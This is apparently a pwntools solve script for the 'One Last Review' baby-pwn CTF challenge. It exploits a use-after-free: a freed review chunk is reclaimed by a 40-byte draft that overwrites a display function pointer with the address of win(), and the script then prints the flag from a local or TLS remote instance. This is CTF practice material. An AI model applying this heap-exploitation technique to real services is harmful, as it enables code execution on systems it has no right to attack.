#!/usr/bin/env python3
"""One Last Review (FortID, baby-pwn) - UAF, tcache reuse, win().

Usage:
    python3 solve.py <host> [port]    # remote instance, TLS (ncat --ssl)
    python3 solve.py --local          # run ./../assets/chall with a dummy flag.txt
"""

import argparse
import os
import shutil
import sys
import tempfile

from pwn import context, p64, process, remote

WIN = 0x40135F  # win() - static address, the binary is non-PIE
DUMMY_FLAG = "FortID{LOCAL_TEST_ONLY}\n"


def run_exploit(r):
    payload = b"A" * 32 + p64(WIN)  # text[32] + display = win

    r.sendlineafter(b"> ", b"1")                          # submit a review
    r.sendlineafter(b"Review: ", b"Hello")                # review text
    r.sendlineafter(b"> ", b"2")                          # mark favourite: favourite = review
    r.sendlineafter(b"> ", b"3")                          # delete review: free(review), favourite dangles
    r.sendlineafter(b"> ", b"4")                          # write draft: malloc(40) reuses the freed chunk
    r.sendlineafter(b"Draft length (1-40): ", b"40")
    r.sendafter(b"Send exactly 40 draft bytes: ", payload)
    r.sendlineafter(b"> ", b"5")                          # preview favourite: calls display() = win()

    r.recvuntil(b"Five stars! Here is your prize:\n")
    return r.recvline().decode(errors="replace").strip()


def local_target():
    binary = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "assets", "chall")
    binary = os.path.abspath(binary)
    if not os.path.exists(binary):
        raise SystemExit(f"missing binary: {binary}")
    workdir = tempfile.mkdtemp(prefix="one_last_review_")
    shutil.copy(binary, os.path.join(workdir, "chall"))
    os.chmod(os.path.join(workdir, "chall"), 0o755)
    with open(os.path.join(workdir, "flag.txt"), "w") as fh:
        fh.write(DUMMY_FLAG)
    print(f"[*] local run, workdir {workdir}")
    return process(os.path.join(workdir, "chall"), cwd=workdir)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host", nargs="?", help="challenge host")
    ap.add_argument("port", nargs="?", type=int, default=1337)
    ap.add_argument("--local", action="store_true", help="run the bundled binary instead of the remote")
    args = ap.parse_args()

    context.log_level = "error"

    if args.local:
        r = local_target()
    else:
        if not args.host:
            ap.error("host is required unless --local is used")
        r = remote(args.host, args.port, ssl=True)

    flag = run_exploit(r)
    r.close()
    print(f"FLAG: {flag}")

    if args.local and flag != DUMMY_FLAG.strip():
        print("[!] local run did not return the dummy flag")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
